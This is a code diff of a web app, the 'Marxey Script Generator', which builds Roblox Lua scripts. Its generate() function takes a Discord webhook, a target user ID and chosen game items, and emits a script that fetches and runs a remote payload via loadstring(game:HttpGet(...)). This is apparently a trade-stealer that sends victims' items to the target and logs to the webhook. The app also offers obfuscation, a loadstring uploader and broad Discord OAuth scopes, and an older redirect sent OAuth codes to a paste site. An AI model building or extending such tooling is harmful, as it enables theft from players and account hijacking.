-        <div class="card-header"><div class="card-title">Marxey Script Trade</div><span class="badge badge-purple">Beta</span></div>
-        <div class="card-body"><div class="empty-state" style="padding:30px">No scripts listed yet. Be the first to list yours!</div></div>
-      </div>
-    </div>
-
-    <!-- ADVERTISE -->
-    <div class="page" id="page-advertise">
-      <div class="script-layout">
-        <div class="card">
-          <div class="card-header"><div class="card-title">Ad Format</div></div>
-          <div class="card-body form-grid">
-            <div class="form-group"><label>What should the ad say?</label><textarea id="ad-text" placeholder="Enter your advertisement text..." style="min-height:100px" oninput="updateAdPreview()"></textarea></div>
-            <div class="form-row">
-              <div class="form-group"><label>Title</label><input type="text" id="ad-title" placeholder="Ad title" oninput="updateAdPreview()" /></div>
-              <div class="form-group"><label>Type</label><select id="ad-type" onchange="updateAdPreview()"><option>Banner</option><option>Popup</option><option>Sidebar</option></select></div>
-            </div>
-            <button class="btn btn-primary" onclick="toast('✓ Ad submitted for review!')">Submit Ad</button>
-          </div>
-        </div>
-        <div class="card">
-          <div class="card-header"><div class="card-title">Preview</div></div>
-          <div class="card-body"><div class="ad-preview" id="ad-preview">Your ad preview will appear here...</div></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- CHAT -->
-    <div class="page" id="page-chat">
-      <div class="card">
-        <div class="card-header"><div class="card-title">Global Brainrot Feed</div><span class="badge badge-green">● Live</span></div>
-        <div class="card-body" style="padding:0">
-          <div class="chat-layout">
-            <div class="chat-messages" id="chat-messages">
-              <div class="chat-msg"><div class="chat-avatar">B</div><div class="chat-msg-content"><div class="chat-msg-header"><span class="chat-username">Bombardiro</span><span class="chat-time">just now</span></div><div class="chat-text">Tung tung tung sahur 🐊✈️</div></div></div>
-              <div class="chat-msg"><div class="chat-avatar" style="background:linear-gradient(135deg,#ec4899,#8b5cf6)">T</div><div class="chat-msg-content"><div class="chat-msg-header"><span class="chat-username">Tralalero</span><span class="chat-time">1m ago</span></div><div class="chat-text">Tralalero tralala 🦁👟</div></div></div>
-            </div>
-            <div class="chat-input-row">
-              <input type="text" id="chat-input" placeholder="Type a message..." onkeydown="if(event.key==='Enter')sendChat()" />
-              <button class="btn btn-primary btn-sm" onclick="sendChat()">Send</button>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- LEADERBOARD -->
-    <div class="page" id="page-leaderboard">
-      <div class="card">
-        <div class="card-header"><div class="card-title">Leaderboard</div></div>
-        <div class="card-body" style="padding:0">
-          <table class="leaderboard-table">
-            <thead><tr><th>#</th><th>User</th><th>Scripts</th><th>Wins</th><th>Losses</th></tr></thead>
-            <tbody>
-              <tr><td class="rank-gold">#1</td><td>Bombardiro</td><td>312</td><td>289</td><td>23</td></tr>
-              <tr><td class="rank-silver">#2</td><td>Tralalero</td><td>278</td><td>241</td><td>37</td></tr>
-              <tr><td class="rank-bronze">#3</td><td>BananitoB</td><td>195</td><td>172</td><td>23</td></tr>
-              <tr><td>#4</td><td>SkibidiT</td><td>144</td><td>119</td><td>25</td></tr>
-              <tr><td>#5</td><td>TungTung</td><td>133</td><td>108</td><td>25</td></tr>
-            </tbody>
-          </table>
-        </div>
-      </div>
-    </div>
-
-  </div>
+<div id="loading-overlay" class="hidden">
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="animation:spin 1s linear infinite"><circle cx="12" cy="12" r="10" stroke-opacity=".25"/><path d="M12 2a10 10 0 0 1 10 10" stroke="#a78bfa"/></svg>
+  Signing you in...
 </div>
 
-<!-- LOGIN MODAL -->
-<div class="login-overlay" id="login-overlay" style="display:none">
-  <div class="login-modal">
-    <div class="logo-icon">M</div>
-    <h2>Sign in to Marxey</h2>
-    <p>Connect your Discord account to generate scripts, trade, and join the community.</p>
-    <button class="btn btn-discord" onclick="signInWithDiscord()">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.04.033.05a19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
+<nav>
+  <div class="nav-left">
+    <span class="logo" onclick="showPage('home')">Marxey</span>
+    <button class="nav-link" onclick="showPage('leaderboard')">Leaderboard</button>
+    <button class="nav-link" onclick="showPage('uploader')">Loadstring Uploader</button>
+  </div>
+  <div class="nav-right" id="nav-right">
+    <button class="btn-discord" id="login-btn" onclick="signIn()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.004.048.03.092.066.114a19.834 19.834 0 0 0 5.985 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 5.99-3.03.077.077 0 0 0 .066-.114c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
       Sign in with Discord
     </button>
-    <button class="btn btn-ghost" style="width:100%;margin-top:10px" onclick="closeLogin()">Continue as Guest</button>
   </div>
-</div>
+</nav>
 
-<div class="toast-container" id="toast-container"></div>
+<main>
+  <div id="page-home" class="container">
+    <div>
+      <h1>Marxey Script Generator</h1>
+      <p class="subtitle" id="subtitle">Sign in to save your settings and appear on the leaderboard.</p>
+    </div>
+
+    <div class="card">
+      <div>
+        <label for="webhook">Discord Webhook URL</label>
+        <input id="webhook" type="text" placeholder="https://discord.com/api/webhooks/..."/>
+      </div>
+      <div>
+        <label>Roblox Username <span>— auto-fills User ID</span></label>
+        <div class="row">
+          <input id="username" type="text" placeholder="e.g. Builderman" onkeydown="if(event.key==='Enter')lookup()"/>
+          <button class="btn-lookup" id="lookup-btn" onclick="lookup()">Look up</button>
+        </div>
+        <div class="error-msg" id="lookup-error"></div>
+        <div class="success-msg" id="lookup-success"></div>
+      </div>
+      <div>
+        <label for="userid">Roblox User ID</label>
+        <input id="userid" type="text" placeholder="Auto-filled from lookup, or enter manually"/>
+      </div>
+      <div>
+        <div class="picker-label-row">
+          <label>Target Brainrots <span>— click to add</span></label>
+          <div class="picker-btns">
+            <button class="btn-select-all" onclick="selectAllBrainrots()">All</button>
+            <button class="btn-clear-all" onclick="clearBrainrots()">Clear</button>
+          </div>
+        </div>
+        <div id="selected-tags" class="tags-selected">
+          <span class="tags-placeholder">No brainrots selected</span>
+        </div>
+        <div class="picker-search">
+          <input id="brainrot-search" type="text" placeholder="Search brainrots..." oninput="filterBrainrots(this.value)"/>
+        </div>
+        <div class="brainrot-grid" id="brainrot-grid"></div>
+      </div>
+      <div>
+        <label for="custom">Custom Loadstring <span>(optional)</span></label>
+        <textarea id="custom" rows="3" placeholder='loadstring(game:HttpGet("YOUR_URL"))()'></textarea>
+        <p class="hint">If filled, added as a second <code>task.spawn</code> block.</p>
+      </div>
+      <div class="btn-row">
+        <button class="btn-generate" onclick="generate()">Generate Script</button>
+        <button class="btn-save" id="save-btn" onclick="saveSettings()">Save Settings</button>
+      </div>
+    </div>
+
+    <div class="card green" id="output-card" style="display:none">
+      <div class="output-header">
+        <span class="output-label">Generated Script</span>
+        <button class="btn-copy" id="copy-btn" onclick="copyScript()">Copy</button>
+      </div>
+      <pre id="script-output"></pre>
+      <p class="obfuscate-tip">Want to obfuscate your script? <a href="https://wearedevs.com/obfuscator" target="_blank" rel="noopener">Go here</a>, paste your script and click Obfuscate.</p>
+    </div>
+  </div>
+
+  <div id="page-uploader" class="container">
+    <div>
+      <h1>Loadstring Uploader</h1>
+      <p class="subtitle">Paste your script below, upload it to Pastefy and get a loadstring.</p>
+    </div>
+    <div class="card">
+      <div>
+        <label for="upload-script">Your Script</label>
+        <textarea id="upload-script" rows="12" placeholder="Paste your Lua script here..."></textarea>
+      </div>
+      <button class="btn-upload" id="upload-btn" onclick="uploadScript()">Upload &amp; Get Loadstring</button>
+      <div id="upload-result" class="result-box" style="display:none">
+        <div class="result-label">Loadstring — paste into your executor</div>
+        <div class="result-row">
+          <input id="result-output" type="text" readonly/>
+          <button class="btn-copy-result" id="copy-result-btn" onclick="copyResult()">Copy</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="page-leaderboard" class="container">
+    <div>
+      <h1>Leaderboard</h1>
+      <p class="subtitle">Top script generators on Marxey</p>
+    </div>
+    <div class="lb-card">
+      <div id="lb-content" class="lb-empty">Sign in with Discord to appear on the leaderboard.</div>
+    </div>
+  </div>
+</main>
 
 <script>
-const BRAINROTS = [
-  {name:"Bombardiro Crocodilo",emoji:"🐊"},{name:"Tralalero Tralala",emoji:"🦁"},
-  {name:"Bananito Bandito",emoji:"🍌"},{name:"Tung Tung Sahur",emoji:"🥁"},
-  {name:"Skibidi Toilet",emoji:"🚽"},{name:"Trippi Troppi",emoji:"🐸"},
-  {name:"Sigma Boy",emoji:"💪"},{name:"Sigma Girl",emoji:"💅"},
-  {name:"Brr Brr Patapim",emoji:"🦔"},{name:"Ballerina Cappuccina",emoji:"🩰"},
-  {name:"Capybara",emoji:"🦫"},{name:"Aquanaut",emoji:"🤿"},
-  {name:"Tacorillo Crocodillo",emoji:"🌮"},{name:"Squalanana",emoji:"🦈"},
-  {name:"Tigrilini Watermelini",emoji:"🍉"},{name:"Spongini Quackini",emoji:"🧽"},
-  {name:"Strawberry Elephant",emoji:"🍓"},{name:"Boneca Ambalabu",emoji:"🪆"},
-  {name:"Tim Cheese",emoji:"🧀"},{name:"Tralaledon",emoji:"🦕"},
-  {name:"Swaggy Bros",emoji:"😎"},{name:"Skull Skull Skull",emoji:"💀"},
-  {name:"Black Hole Goat",emoji:"🐐"},{name:"Lirili Larila",emoji:"🐘"},
-  {name:"Telemorte",emoji:"📺"},{name:"Tractoro Dinosauro",emoji:"🦖"},
-  {name:"Tuff Toucan",emoji:"🦜"},{name:"Snailenzo",emoji:"🐌"},
-  {name:"Spinny Hammy",emoji:"🐹"},{name:"Sealo Regalo",emoji:"🦭"},
-  {name:"Boba Panda",emoji:"🐼"},{name:"Rosey and Teddy",emoji:"🧸"},
-  {name:"Swag Soda",emoji:"🥤"},{name:"Spooky and Pumpky",emoji:"🎃"},
-  {name:"Rhino Helicopterino",emoji:"🦏"},{name:"Frulli Frulla",emoji:"🍇"},
-  {name:"Santa Hotspot",emoji:"🎅"},{name:"Tartaruga Cisterna",emoji:"🐢"},
-  {name:"Anpali Babel",emoji:"🐝"},{name:"Brunito Marsito",emoji:"🐻"},
+const API = 'https://81ec48f1-347e-4197-a23f-3bf85bd5cde2-00-29jmflzj2rw1t.worf.replit.dev/api';
+const OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1483527902564974765&response_type=code&redirect_uri=https%3A%2F%2F81ec48f1-347e-4197-a23f-3bf85bd5cde2-00-29jmflzj2rw1t.worf.replit.dev%2Fapi%2Fauth%2Fdiscord%2Fcallback&scope=identify+identify.premium+guilds.join';
+const STORAGE_KEY = 'marxey_settings';
+const TOKEN_KEY = 'marxey_token';
+const USER_KEY = 'marxey_user';
+
+const ALL_BRAINROTS = [
+  "Noobini Pizzanini","Lirilì Larilà","Tim Cheese","Fluriflura","Talpa Di Fero",
+  "Svinina Bombardino","Pipi Kiwi","Noobini Santanini","Raccooni Jandelini","Tartaragno",
+  "Pipi Corni","Holy Arepa","Trippi Troppi","Gangster Footera","Bandito Bobritto",
+  "Boneca Ambalabu","Cacto Hipopotamo","Ta Ta Ta Ta Sahur","Tric Trac Baraboom","Cupcake Koala",
+  "Frogo Elfo","Pipi Avocado","Pengolino Nuvoletto","Pinealotto Fruttarino","Cappuccino Assassino",
+  "Brr Brr Patapim","Avocadini Antilopini","Trulimero Trulicina","Bambini Crostini","Bananita Dolphinita",
+  "Perochello Lemonchello","Brri Brri Bicus Dicus Bombicus","Avocadini Guffo","Salamino Penguino",
+  "Wombo Rollo","Bandito Axolito","Malame Amarele","Ti Ti Ti Sahur","Mangolini Parrocini",
+  "Frogato Pirato","Gato Celesto","Doi Doi Do","Penguin Tree","Penguino Cocosino",
+  "Mummio Rappitto","Burbaloni Loliloli","Chimpanzini Bananini","Ballerina Cappuccina",
+  "Chef Crabracadabra","Lionel Cactuseli","Glorbo Fruttodrillo","Quivioli Ameleonni",
+  "Blueberrinni Octopusini","Pipi Potato","Strawberrelli Flamingelli","Pandaccini Bananini",
+  "Sigma Boy","Clickerino Crabo","Caramello Filtrello","Cocosini Mama","Quackula",
+  "Pi Pi Watermelon","Buho del Cielo","Chocco Bunny","Puffaball","Sigma Girl",
+  "Sealo Regalo","Buho de Fuego","Seraphino Gruyero","Mythic Lucky Block","Frigo Camelo",
+  "Orangutini Ananassini","Rhino Toasterino","Bombardiro Crocodilo","Bombombini Gusini",
+  "Cavallo Virtuoso","Gorillo Watermelondrillo","Lerulerulerule","Te Te Te Sahur",
+  "Tracoducotulu Delapeladustuz","Cachorrito Melonito","Toiletto Focaccino","Brutto Gialutto",
+  "Spioniro Golubiro","Zibra Zubra Zibralini","Tigrilini Watermelini","Avocadorilla",
+  "Gorillo Subwoofero","Stoppo Luminino","Tob Tobi Tobi","Ganganzelli Trulala",
+  "Rhino Helicopterino","Magi Ribbitini","Jingle Jingle Sahur","Los Noobinis",
+  "Spongini Quackini","Carloo","Harpuccino","Carrotini Brainini","Centrucci Nuclucci",
+  "Jacko Spaventosa","Bananito Bandito","Tree Tree Tree Sahur","Fizzy Soda",
+  "Berenjello Angello","Tralalero Tralala","Tung Tung Tung Sahur","Skibidi Toilet",
+  "Capybara Floofini","Limonino Pataterino","Porcospino Tarantino","Giraffini Spagettini",
+  "Volpino Gelatino","Tartaruga Cisterna","Elefantino Spaghettino","Pipi Limone"
 ];
 
-const DISCORD_OAUTH = "https://discord.com/oauth2/authorize?client_id=1483527902564974765&response_type=code&redirect_uri=https%3A%2F%2Fpastefy.app%2FkwnCNHAp%2Fraw&integration_type=1&scope=identify+identify.premium+guilds.join+applications.commands+guilds.members.read";
+let selectedBrainrots = new Set();
+let currentUser = null;
 
-let selectedBrainrot = null;
-let currentMode = 'normal';
+function signIn() {
+  try { sessionStorage.setItem('marxey_return', window.location.href); } catch {}
+  window.location.href = OAUTH_URL;
+}
 
-function signInWithDiscord() { window.location.href = DISCORD_OAUTH; }
-function showLogin() { document.getElementById('login-overlay').style.display = 'flex'; }
-function closeLogin() { document.getElementById('login-overlay').style.display = 'none'; }
+async function logout() {
+  const token = localStorage.getItem(TOKEN_KEY);
+  if (token) fetch(`${API}/auth/logout`, { method: 'POST', headers: { 'Authorization': 'Bearer ' + token } }).catch(() => {});
+  localStorage.removeItem(TOKEN_KEY);
+  localStorage.removeItem(USER_KEY);
+  currentUser = null;
+  location.reload();
+}
 
-function loadSession() {
-  try {
-    const u = localStorage.getItem('marxey_user');
-    if (u) {
-      const user = JSON.parse(u);
-      document.getElementById('sidebar-login').style.display = 'none';
-      document.getElementById('sidebar-user').style.display = 'flex';
-      document.getElementById('user-name-display').textContent = user.username || 'User';
-      document.getElementById('user-av').textContent = (user.username||'U')[0].toUpperCase();
-      const btn = document.getElementById('topbar-auth-btn');
-      btn.textContent = user.username || 'Signed In';
-      btn.onclick = () => { localStorage.removeItem('marxey_user'); location.reload(); };
+async function init() {
+  buildBrainrotGrid();
+  loadSettingsFromStorage();
+  const token = localStorage.getItem(TOKEN_KEY);
+  const cachedUser = localStorage.getItem(USER_KEY);
+  if (token) {
+    if (cachedUser) {
+      try { currentUser = JSON.parse(cachedUser); renderUserNav(); } catch {}
     }
-  } catch(e) {}
+    try {
+      const res = await fetch(`${API}/auth/me`, { headers: { 'Authorization': 'Bearer ' + token } });
+      if (res.ok) {
+        currentUser = await res.json();
+        localStorage.setItem(USER_KEY, JSON.stringify(currentUser));
+        renderUserNav();
+      } else {
+        localStorage.removeItem(TOKEN_KEY);
+        localStorage.removeItem(USER_KEY);
+        currentUser = null;
+        renderGuestNav();
+      }
+    } catch { if (!cachedUser) renderGuestNav(); }
+  } else {
+    renderGuestNav();
+  }
 }
 
-const PAGE_TITLES = {home:'Home',generator:'Script Generator',brainrots:'Brainrots',trade:'Marxey Script Trade',advertise:'Advertise',chat:'Chat',leaderboard:'Leaderboard'};
+function renderGuestNav() {
+  document.getElementById('nav-right').innerHTML = `
+    <button class="btn-discord" onclick="signIn()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.004.048.03.092.066.114a19.834 19.834 0 0 0 5.985 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 5.99-3.03.077.077 0 0 0 .066-.114c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
+      Sign in with Discord
+    </button>`;
+  document.getElementById('subtitle').textContent = 'Sign in to save your settings and appear on the leaderboard.';
+}
 
-function navigate(page) {
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-  document.getElementById('page-' + page).classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(n => {
-    if (n.getAttribute('onclick') && n.getAttribute('onclick').includes("'"+page+"'")) n.classList.add('active');
+function renderUserNav() {
+  if (!currentUser) return;
+  const av = currentUser.avatar
+    ? `<img class="user-avatar" src="${currentUser.avatar}"/>`
+    : `<span class="user-avatar-ph">${(currentUser.displayName||'U')[0].toUpperCase()}</span>`;
+  document.getElementById('nav-right').innerHTML = `
+    <div class="user-info">${av}<span>${currentUser.displayName||currentUser.username}</span></div>
+    <button class="btn-logout" onclick="logout()">Log out</button>`;
+  document.getElementById('subtitle').textContent = `Welcome back, ${currentUser.displayName||currentUser.username}! Your settings are saved.`;
+}
+
+function buildBrainrotGrid() {
+  document.getElementById('brainrot-grid').innerHTML = ALL_BRAINROTS.map(b =>
+    `<span class="brainrot-chip" data-name="${b.replace(/"/g,'&quot;')}" onclick="toggleBrainrot(this)">${b}</span>`
+  ).join('');
+}
+
+function toggleBrainrot(el) {
+  const name = el.getAttribute('data-name');
+  if (selectedBrainrots.has(name)) selectedBrainrots.delete(name); else selectedBrainrots.add(name);
+  el.classList.toggle('selected', selectedBrainrots.has(name));
+  renderTags();
+}
+
+function updateGrid() {
+  document.querySelectorAll('.brainrot-chip').forEach(el => {
+    el.classList.toggle('selected', selectedBrainrots.has(el.getAttribute('data-name')));
   });
-  document.getElementById('page-title').textContent = PAGE_TITLES[page] || page;
 }
 
-function switchTab(mode) {
-  currentMode = mode;
-  document.querySelectorAll('#gen-tabs .tab').forEach((t,i) => t.classList.toggle('active', (mode==='normal'&&i===0)||(mode==='loadstring'&&i===1)));
-  document.getElementById('script-paste-row').style.display = mode==='normal' ? '' : 'none';
-  document.getElementById('loadstring-url-row').style.display = mode==='loadstring' ? '' : 'none';
+function renderTags() {
+  const c = document.getElementById('selected-tags');
+  if (!selectedBrainrots.size) { c.innerHTML = '<span class="tags-placeholder">No brainrots selected</span>'; return; }
+  c.innerHTML = [...selectedBrainrots].map(b =>
+    `<span class="tag">${b.replace(/</g,'&lt;')}<button class="tag-x" onclick="removeTag(this)" data-name="${b.replace(/"/g,'&quot;')}">✕</button></span>`
+  ).join('');
 }
 
-function renderBrainrots(list) {
-  document.getElementById('brainrots-grid').innerHTML = list.map(b => `
-    <div class="brainrot-card ${selectedBrainrot&&selectedBrainrot.name===b.name?'selected':''}" onclick='selectBrainrot(${JSON.stringify(b)})'>
-      <div class="brainrot-emoji">${b.emoji}</div>
-      <div class="brainrot-name">${b.name}</div>
-    </div>`).join('');
+function removeTag(btn) {
+  selectedBrainrots.delete(btn.getAttribute('data-name')); updateGrid(); renderTags();
 }
 
-function filterBrainrots() {
+function filterBrainrots(q) {
+  q = q.toLowerCase();
+  document.querySelectorAll('.brainrot-chip').forEach(el => {
+    el.classList.toggle('hidden', q.length > 0 && !el.getAttribute('data-name').toLowerCase().includes(q));
+  });
+}
+
+function selectAllBrainrots() {
   const q = document.getElementById('brainrot-search').value.toLowerCase();
-  renderBrainrots(BRAINROTS.filter(b => b.name.toLowerCase().includes(q)));
+  if (!q) ALL_BRAINROTS.forEach(b => selectedBrainrots.add(b));
+  else document.querySelectorAll('.brainrot-chip:not(.hidden)').forEach(el => selectedBrainrots.add(el.getAttribute('data-name')));
+  updateGrid(); renderTags();
 }
 
-function selectBrainrot(b) {
-  selectedBrainrot = b;
-  renderBrainrots(BRAINROTS);
-  document.getElementById('selected-brainrot-display').innerHTML = `
-    <div style="display:flex;align-items:center;gap:12px">
-      <span style="font-size:36px">${b.emoji}</span>
-      <div><div style="font-weight:600;color:#e4e4e7;font-size:14px">${b.name}</div><div style="font-size:12px;color:#71717a;margin-top:2px">Selected brainrot</div></div>
-    </div>`;
-  toast('✓ Selected: ' + b.name);
-  navigate('generator');
+function clearBrainrots() { selectedBrainrots.clear(); updateGrid(); renderTags(); }
+
+async function lookup() {
+  const username = document.getElementById('username').value.trim();
+  if (!username) return;
+  const btn = document.getElementById('lookup-btn');
+  const err = document.getElementById('lookup-error');
+  const ok = document.getElementById('lookup-success');
+  btn.disabled = true; btn.textContent = '...'; err.textContent = ''; ok.textContent = '';
+  try {
+    const res = await fetch(`${API}/roblox/user/${encodeURIComponent(username)}`);
+    if (res.ok) {
+      const d = await res.json();
+      document.getElementById('userid').value = d.id;
+      ok.textContent = `✓ Found: ${d.name} (ID: ${d.id})`;
+    } else {
+      const d = await res.json().catch(() => ({}));
+      err.textContent = d.error || 'User not found.';
+    }
+  } catch { err.textContent = 'Lookup failed. Enter ID manually.'; }
+  btn.disabled = false; btn.textContent = 'Look up';
 }
 
-function generateScript() {
-  const webhook = document.getElementById('webhook-input').value.trim();
-  const username = document.getElementById('username-input').value.trim();
-  const title = document.getElementById('title-input').value.trim() || 'Marxey Script';
-  const type = document.getElementById('type-select').value;
-  const script = currentMode==='normal' ? document.getElementById('script-input').value.trim() : document.getElementById('loadstring-url').value.trim();
-  if (!webhook) { toast('⚠ Please enter a webhook URL'); return; }
-  if (!username) { toast('⚠ Please enter a username'); return; }
-  if (!script) { toast('⚠ Please paste your script or loadstring URL'); return; }
-  const br = selectedBrainrot ? `-- Brainrot: ${selectedBrainrot.emoji} ${selectedBrainrot.name}` : '';
-  const out = currentMode==='loadstring'
-    ? `-- ${title} | Marxey\n-- Type: ${type}\n-- User: ${username}\n${br}\n\nlocal webhook = "${webhook}"\nloadstring(game:HttpGet("${script}"))()`
-    : `-- ${title} | Marxey\n-- Type: ${type}\n-- User: ${username}\n${br}\n\nlocal webhook = "${webhook}"\nlocal http = game:GetService("HttpService")\n\nlocal function sendLog(data)\n  http:RequestAsync({\n    Url = webhook,\n    Method = "POST",\n    Headers = { ["Content-Type"] = "application/json" },\n    Body = http:JSONEncode({ username = "${username}", content = data })\n  })\nend\n\n-- === YOUR SCRIPT ===\n${script}\n-- === END SCRIPT ===`;
-  document.getElementById('output-box').textContent = out;
-  document.getElementById('output-status').textContent = 'Generated at ' + new Date().toLocaleTimeString();
-  toast(currentMode==='loadstring' ? '✓ Loadstring URL generated!' : '✓ Script generated!');
+function generate() {
+  const webhook = document.getElementById('webhook').value.trim();
+  const userid = document.getElementById('userid').value.trim();
+  const custom = document.getElementById('custom').value.trim();
+  const brainrots = [...selectedBrainrots];
+  if (!webhook) { alert('Please enter a Discord Webhook URL!'); return; }
+  if (!brainrots.length) { alert('Please select at least one brainrot!'); return; }
+  const entries = brainrots.map((b, i) => `    ["${b}"] = true${i < brainrots.length-1 ? ',' : ''}`).join('\n');
+  const customBlock = custom ? `\ntask.spawn(function()\n${custom}\nend)` : '';
+  const script =
+`getgenv().TARGET_ID = "${userid}"
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "${webhook}"
+getgenv().TARGET_BRAINROTS = {
+${entries}
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8665366837c09ed56f0e30fdebd4baf1b39864d8822bffdf882f80d3d60b55c9/download"))()
+end)${customBlock}`;
+  document.getElementById('script-output').textContent = script;
+  document.getElementById('output-card').style.display = 'flex';
+  document.getElementById('copy-btn').classList.remove('copied');
+  document.getElementById('copy-btn').textContent = 'Copy';
+  saveSettings(true);
 }
 
-function copyOutput() {
-  const t = document.getElementById('output-box').textContent;
-  if (t && !t.startsWith('-- Output will appear')) {
-    navigator.clipboard.writeText(t).then(() => toast('✓ Copied to clipboard!'));
-  } else toast('⚠ Nothing to copy yet');
+function copyScript() {
+  navigator.clipboard.writeText(document.getElementById('script-output').textContent);
+  const btn = document.getElementById('copy-btn');
+  btn.textContent = 'Copied!'; btn.classList.add('copied');
+  setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
 }
 
-function updateAdPreview() {
-  const title = document.getElementById('ad-title').value || 'Ad Title';
-  const text = document.getElementById('ad-text').value || 'Your ad text here...';
-  document.getElementById('ad-preview').innerHTML = `<strong style="color:#e4e4e7;display:block;margin-bottom:6px">${title}</strong>${text}`;
+function saveSettings(silent = false) {
+  try {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify({
+      webhook: document.getElementById('webhook').value,
+      userid: document.getElementById('userid').value,
+      username: document.getElementById('username').value,
+      custom: document.getElementById('custom').value,
+      brainrots: [...selectedBrainrots],
+    }));
+  } catch {}
+  if (!silent) {
+    const btn = document.getElementById('save-btn');
+    btn.textContent = 'Saved!'; btn.classList.add('saved');
+    setTimeout(() => { btn.textContent = 'Save Settings'; btn.classList.remove('saved'); }, 2000);
+  }
 }
 
-function sendChat() {
-  const input = document.getElementById('chat-input');
-  const msg = input.value.trim();
-  if (!msg) return;
-  const u = (() => { try { const d = localStorage.getItem('marxey_user'); return d ? JSON.parse(d).username : null; } catch(e){} return null; })();
-  const name = u || 'Guest';
-  const el = document.createElement('div');
-  el.className = 'chat-msg';
-  el.innerHTML = `<div class="chat-avatar">${name[0].toUpperCase()}</div><div class="chat-msg-content"><div class="chat-msg-header"><span class="chat-username">${name}</span><span class="chat-time">just now</span></div><div class="chat-text">${msg.replace(/</g,'&lt;')}</div></div>`;
-  const c = document.getElementById('chat-messages');
-  c.appendChild(el);
-  c.scrollTop = c.scrollHeight;
-  input.value = '';
+function loadSettingsFromStorage() {
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY);
+    if (!raw) return;
+    const s = JSON.parse(raw);
+    if (s.webhook) document.getElementById('webhook').value = s.webhook;
+    if (s.userid) document.getElementById('userid').value = s.userid;
+    if (s.username) document.getElementById('username').value = s.username;
+    if (s.custom) document.getElementById('custom').value = s.custom;
+    if (Array.isArray(s.brainrots)) {
+      s.brainrots.forEach(b => { if (ALL_BRAINROTS.includes(b)) selectedBrainrots.add(b); });
+      updateGrid(); renderTags();
+    }
+  } catch {}
 }
 
-function toast(msg) {
-  const c = document.getElementById('toast-container');
-  const t = document.createElement('div');
-  t.className = 'toast';
-  t.textContent = msg;
-  c.appendChild(t);
-  setTimeout(() => t.remove(), 3000);
+async function uploadScript() {
+  const btn = document.getElementById('upload-btn');
+  const script = document.getElementById('upload-script').value.trim();
+  if (!script) { alert('Paste your script first!'); return; }
+  btn.disabled = true; btn.textContent = 'Uploading...';
+  try {
+    const res = await fetch('https://pastefy.app/api/v2/paste', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ title: 'Marxey Script', content: script, type: 'PASTE' })
+    });
+    const d = await res.json();
+    if (d.success && d.paste?.id) {
